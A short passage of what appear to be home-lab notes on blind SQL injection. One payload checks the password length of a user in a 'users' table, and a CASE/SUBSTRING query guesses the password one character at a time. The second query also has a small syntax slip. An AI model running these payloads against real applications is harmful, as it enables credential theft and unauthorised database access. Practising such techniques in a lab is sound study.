        and (select 'a' from users where username = 'foo' and length(password)>1)='a

    * To get the password by issuing one char at a time while looping through the password length

        #SUBSTRING PASSWORD GUESSING WITH CASE - HOME LAB
        select password (case when substring(password, 2,1) = 'u' then "RIGHT" else "NOOO" end) from blah where user = 'nobody';
